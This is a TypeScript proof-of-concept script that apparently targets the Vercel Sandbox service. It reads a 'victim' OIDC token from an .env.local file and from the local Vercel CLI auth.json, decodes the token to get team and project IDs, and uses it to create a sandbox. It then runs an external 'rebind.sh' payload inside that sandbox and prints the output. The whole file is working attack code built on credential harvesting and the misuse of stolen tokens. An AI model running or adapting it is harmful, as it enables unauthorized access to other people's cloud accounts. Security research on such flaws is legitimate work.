import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";
import { APIClient } from "/tmp/vercel-sandbox/node_modules/@vercel/sandbox/dist/api-client/api-client.js";

async function main() {
  const client = new APIClient({ token: VICTIM, teamId, projectId });
  const name = "rebind-" + Date.now();
  const sbx = await Sandbox.create({ name, token: VICTIM, teamId, projectId,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" }, ports: [3000] });
  const mySub = sbx.domain(3000).replace(/^https?:\/\//, "").replace(/\/.*/, "");
  console.log("MI SUBDOMINIO:", mySub);
  const script = readFileSync("/tmp/vercel-sandbox/poc/rebind.sh", "utf8").replace("$MYSUB", mySub);
  const r = await sbx.runCommand("bash", ["-c", script], { wait: true, timeout: 40_000 });
  const out = await r.output("both");
  console.log(out);
  console.log("DONE");
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });